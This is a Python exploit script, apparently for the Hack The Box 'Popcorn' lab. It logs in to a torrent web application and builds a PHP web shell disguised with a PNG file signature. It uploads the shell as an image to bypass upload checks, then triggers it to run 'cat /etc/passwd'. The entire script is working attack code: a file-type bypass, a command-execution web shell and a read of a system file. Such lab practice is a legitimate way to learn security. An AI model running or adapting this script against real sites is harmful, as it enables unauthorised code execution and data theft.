import requests

def create_shell():
	png_signature = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00'
	
	php_code = "<?php system($_GET['cmd']);?>"

	with open("shell.php", "wb") as f:
	    f.write(png_signature)
	
	with open("shell.php", "a") as f:
	    f.write(php_code)


lab_url = "http://popcorn.htb/torrent/"
username = "test"
password = "test"
torrent_id = "1447bb03de993e1ee7e430526ff1fbac0daf7b44"

data = {
	'username':username, 
	'password':password
	}

proxies = {
	'http':"http://127.0.0.1:8080", 
	'https':"http://127.0.0.1:8080"
	}


session = requests.Session()

# Auth
response = session.post(
	lab_url + "login.php", 
	data=data, 
	proxies=proxies)

# Upload shell
create_shell()

files = {'file': ('shell.php', open('shell.php', 'rb'), 'image/png')}
response = session.post(
	lab_url + "upload_file.php?mode=upload&id={}".format(torrent_id), 
	files = files,
	proxies = proxies
)

# Getting RCE
response = session.get(
	lab_url + "upload/{}.php?cmd=cat+/etc/passwd".format(torrent_id),
	proxies=proxies)
print(response.content[18:])